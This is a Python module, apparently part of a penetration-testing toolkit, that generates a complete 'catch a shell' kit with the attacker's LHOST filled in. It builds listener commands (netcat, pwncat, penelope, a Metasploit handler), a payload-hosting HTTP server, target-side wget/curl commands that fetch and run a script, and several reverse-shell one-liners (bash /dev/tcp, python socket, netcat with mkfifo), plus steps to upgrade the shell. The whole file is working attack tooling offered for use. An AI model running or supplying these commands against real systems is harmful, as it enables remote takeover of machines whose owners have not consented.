"""Reverse-shell handler kit.

Closes the loop after payload generation/delivery: a ready "catch a shell" kit -
a listener to run on your box, an HTTP server to host the payload, the target-side
one-liners to fetch and execute it (with the real LHOST filled in), and the PTY
upgrade steps once the shell lands.

Pure string generation (deterministic, offline-testable); the `listen` command can
optionally launch the listener for real.
"""

from __future__ import annotations

from dataclasses import dataclass, field


@dataclass
class ShellKit:
    listeners: list[str] = field(default_factory=list)
    http_server: str = ""
    pull: list[str] = field(default_factory=list)      # target-side fetch + exec
    reverse_shells: list[str] = field(default_factory=list)
    upgrade: list[str] = field(default_factory=list)


def build_kit(lhost: str = "LHOST", lport: int = 4444, http_port: int = 8000,
              serve_dir: str = ".", payload: str = "shell.sh") -> ShellKit:
    """A full reverse-shell catch kit, LHOST/LPORT filled in."""
    return ShellKit(
        listeners=[
            f"rlwrap nc -lvnp {lport}                 # readline-wrapped netcat (simplest)",
            f"pwncat-cs -lp {lport}                   # pwncat: auto-stabilizes + persistence",
            f"penelope -p {lport}                     # penelope: auto-PTY + logging",
            f"msfconsole -q -x 'use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; "
            f"set LHOST {lhost}; set LPORT {lport}; run'",
        ],
        http_server=f"python3 -m http.server {http_port} --directory {serve_dir}   "
                    "# host payloads for the target to pull",
        pull=[
            f"wget -q http://{lhost}:{http_port}/{payload} -O /tmp/{payload}; bash /tmp/{payload}",
            f"curl -s http://{lhost}:{http_port}/{payload} | bash",
        ],
        reverse_shells=[
            f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
            f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{lhost}\",{lport}));"
            "[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'",
            f"nc {lhost} {lport} -e /bin/bash                 # if nc has -e",
            f"nc -e /bin/sh {lhost} {lport} || rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|"
            f"nc {lhost} {lport} >/tmp/f   # nc without -e",
        ],
        upgrade=[
            "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
            "# Ctrl-Z, then on your box:  stty raw -echo; fg",
            "export TERM=xterm; stty rows 50 cols 200",
        ],
    )


def kit_lines(lhost: str = "LHOST", lport: int = 4444, http_port: int = 8000,
              serve_dir: str = ".", payload: str = "shell.sh") -> list[str]:
    """Flatten the kit to printable, sectioned lines."""
    kit = build_kit(lhost, lport, http_port, serve_dir, payload)
    out: list[str] = ["# 1) start a listener on your box:"]
    out += ["    " + c for c in kit.listeners]
    out += ["# 2) host the payload:", "    " + kit.http_server]
    out += ["# 3) on the target, fetch + run it:"]
    out += ["    " + c for c in kit.pull]
    out += ["# ... or a direct reverse shell:"]
    out += ["    " + c for c in kit.reverse_shells]
    out += ["# 4) upgrade the shell to a full PTY:"]
    out += ["    " + c for c in kit.upgrade]
    return out
